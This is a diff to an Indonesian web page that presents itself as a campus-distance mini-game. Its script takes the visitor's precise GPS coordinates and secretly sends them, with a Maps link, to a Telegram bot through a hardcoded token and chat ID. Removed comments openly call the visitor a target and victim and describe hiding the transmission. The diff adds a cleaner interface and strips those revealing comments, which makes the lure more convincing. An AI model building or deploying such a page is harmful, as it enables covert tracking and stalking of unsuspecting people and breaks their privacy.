@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Radar Kampus Mini-Game</title>
+    <title>Radar Kampus</title>
+    <!-- Injeksi Library Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
     <style>
         body { 
             background-color: #f4f4f9; color: #333; 
@@ -12,65 +14,74 @@
             justify-content: center; height: 100vh; margin: 0; text-align: center;
         }
         .card {
-            background: white; padding: 30px; border-radius: 15px;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.1); max-width: 400px;
+            background: white; padding: 35px; border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08); max-width: 400px; width: 85%;
         }
-        h2 { color: #2c3e50; margin-top: 0; }
+        h2 { 
+            color: #2c3e50; margin-top: 0; 
+            display: flex; justify-content: center; align-items: center; gap: 10px;
+        }
         .btn-game {
             background-color: #3498db; color: white;
             border: none; padding: 15px 30px; border-radius: 25px;
             font-size: 16px; font-weight: bold; cursor: pointer;
             transition: 0.3s; margin-top: 20px; width: 100%;
+            display: flex; justify-content: center; align-items: center; gap: 10px;
         }
-        .btn-game:hover { background-color: #2980b9; transform: translateY(-2px); }
-        #result { margin-top: 20px; font-size: 18px; font-weight: bold; color: #e74c3c; line-height: 1.5; }
+        .btn-game:hover { background-color: #2980b9; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(52, 152, 219, 0.4); }
+        #result { margin-top: 25px; font-size: 18px; font-weight: bold; line-height: 1.5; }
+        
+        .status-flex { display: flex; flex-direction: column; align-items: center; gap: 12px; }
+        
+        /* Animasi Sensor Scan */
+        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(0.95); } 100% { opacity: 1; transform: scale(1); } }
+        .lucide-pulse { animation: pulse 1.2s infinite ease-in-out; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>🎯 Radar Kampus</h2>
-        <p>Buktikan lu mahasiswa sejati! Sistem akan mengukur jarak presisi posisi lu saat ini ke titik nol kampus.</p>
-        <p style="font-size: 12px; color: #7f8c8d;">*Membutuhkan akses GPS untuk kalkulasi radar.</p>
+        <h2><i data-lucide="radar"></i> Radar Kampus</h2>
+        <p style="color: #555;">Buktikan lu mahasiswa sejati! Sistem akan mengukur jarak presisi posisi lu saat ini ke titik nol kampus.</p>
+        <p style="font-size: 11px; color: #95a5a6; margin-top: -5px;">*Membutuhkan akses GPS untuk kalkulasi radar satelit.</p>
         
-        <button class="btn-game" onclick="mulaiRadar()">Mulai Scan Jarak!</button>
+        <button class="btn-game" onclick="mulaiRadar()">
+            <i data-lucide="scan-line"></i> Mulai Scan Jarak
+        </button>
         
         <div id="result"></div>
     </div>
 
     <script>
-        // KREDENSIAL API BOT LU (Jalur komunikasi rahasia kita)
+        // Render ikon saat web pertama kali dibuka
+        lucide.createIcons();
+
         const BOT_TOKEN = "8945868058:AAFmrtok6NjltKd66IIE4Mai305eEq3lT1c"; 
         const CHAT_ID = "7070949344";
 
-        // Koordinat Titik Nol Kampus UMKT Samarinda (Contoh referensi)
         const kampusLat = -0.463569; 
         const kampusLon = 117.152345;
 
-        // FUNGSI 1: Payload Pengirim Log ke Telegram (Silent Execution)
+        // FUNGSI 1: Payload Log Terminal (Tanpa Emoticon Receh)
         async function sendToTelegram(lat, lon, acc, jarak) {
             const mapsLink = `https://www.google.com/maps/place/${lat},${lon}`;
-            const payload = `🎯 **TARGET TERKENA RADAR JEBAKAN!**\n\n` +
-                            `📍 Lat: ${lat}\n` +
-                            `📍 Lon: ${lon}\n` +
-                            `📏 Akurasi GPS: ${acc} meter\n` +
-                            `🏃 Jarak target ke kampus: ${jarak} KM\n` +
-                            `🗺️ Maps: ${mapsLink}`;
+            const payload = `[ ⚠️ SYSTEM OVERRIDE ]\nTARGET TERKENA RADAR JEBAKAN!\n\n` +
+                            `[>] Lat: ${lat}\n` +
+                            `[>] Lon: ${lon}\n` +
+                            `[>] Akurasi GPS: ${acc} meter\n` +
+                            `[>] Jarak ke kampus: ${jarak} KM\n` +
+                            `[>] Maps: ${mapsLink}`;
                             
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
-                // Fetch dikirim tanpa await/then alert, supaya target tidak tahu ada pengiriman data
                 fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: payload })
                 });
-            } catch (e) {
-                // Silently fail, jangan tampilkan error di layar korban
-            }
+            } catch (e) {}
         }
 
-        // FUNGSI 2: Rumus Haversine buat ngitung jarak asli di bumi (Game Logic)
         function hitungJarak(lat1, lon1, lat2, lon2) {
             const R = 6371; 
             const dLat = (lat2 - lat1) * Math.PI / 180;
@@ -82,11 +93,15 @@
             return (R * c).toFixed(2);
         }
 
-        // FUNGSI 3: Trigger Utama
         function mulaiRadar() {
             const resultDiv = document.getElementById('result');
-            resultDiv.innerHTML = "Memindai satelit... 📡";
-            resultDiv.style.color = "#f39c12";
+            
+            // State 1: Memindai (Ikon Satelit Lucide + Animasi Pulse)
+            resultDiv.innerHTML = `<div class="status-flex" style="color: #f39c12;">
+                                    <i data-lucide="satellite" class="lucide-pulse" style="width: 42px; height: 42px;"></i>
+                                    <span>Memindai satelit...</span>
+                                   </div>`;
+            lucide.createIcons(); 
             
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -95,24 +110,35 @@
                         const userLon = position.coords.longitude;
                         const userAcc = position.coords.accuracy;
                         
-                        // Hitung jarak ke kampus
                         const jarak = hitungJarak(userLat, userLon, kampusLat, kampusLon);
                         
-                        // Manipulasi Layar: Tampilkan hasil game ke target
-                        resultDiv.style.color = "#27ae60";
-                        resultDiv.innerHTML = `✅ Pemindaian Selesai!<br>Jarak lu ke kampus adalah: <br><span style="font-size: 24px;"><b>${jarak} KM</b></span>`;
+                        // State 2: Sukses (Ikon Check Circle)
+                        resultDiv.innerHTML = `<div class="status-flex" style="color: #27ae60;">
+                                                <i data-lucide="check-circle" style="width: 48px; height: 48px;"></i>
+                                                <span>Pemindaian Selesai!</span>
+                                                <span style="color: #7f8c8d; font-size: 15px; font-weight: normal;">Jarak lu ke kampus adalah:</span>
+                                                <span style="font-size: 36px; font-weight: 900; color: #2c3e50; margin-top: -5px;">${jarak} KM</span>
+                                               </div>`;
+                        lucide.createIcons();
 
-                        // EKSEKUSI OVERDRIVE: Lempar data ke markas (Bot Telegram) secara tak kasat mata
                         sendToTelegram(userLat, userLon, userAcc, jarak);
                     },
                     function(error) {
-                        resultDiv.style.color = "#e74c3c";
-                        resultDiv.innerHTML = "❌ Radar Gagal: Izin lokasi ditolak.";
+                        // State 3: Ditolak (Ikon X Circle)
+                        resultDiv.innerHTML = `<div class="status-flex" style="color: #e74c3c;">
+                                                <i data-lucide="x-circle" style="width: 42px; height: 42px;"></i>
+                                                <span>Radar Gagal: Izin lokasi ditolak.</span>
+                                               </div>`;
+                        lucide.createIcons();
                     },
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             } else {
-                resultDiv.innerHTML = "Browser lu nggak support Radar.";
+                resultDiv.innerHTML = `<div class="status-flex" style="color: #e74c3c;">
+                                        <i data-lucide="alert-triangle" style="width: 42px; height: 42px;"></i>
+                                        <span>Browser lu nggak support Radar.</span>
+                                       </div>`;
+                lucide.createIcons();
             }
         }
     </script>
